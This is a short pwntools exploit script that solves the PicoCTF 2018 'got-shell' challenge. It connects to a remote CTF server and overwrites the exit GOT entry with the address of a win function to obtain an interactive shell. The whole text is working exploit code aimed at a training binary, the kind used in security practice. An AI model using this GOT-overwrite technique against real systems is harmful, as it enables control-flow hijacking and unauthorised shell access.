from pwn import *

context.log_level='debug'

p=remote('node5.buuoj.cn',28532)

elf=ELF("/home/lixingjian/pwn/PicoCTF_2018_got-shell")

exit_got=elf.got['exit']
win_add=0x804854B

p.recvuntil(b'write this 4 byte value?')
p.sendline(hex(exit_got))

p.recvuntil(b'would you like to write to')
p.sendline(hex(win_add))

p.interactive()
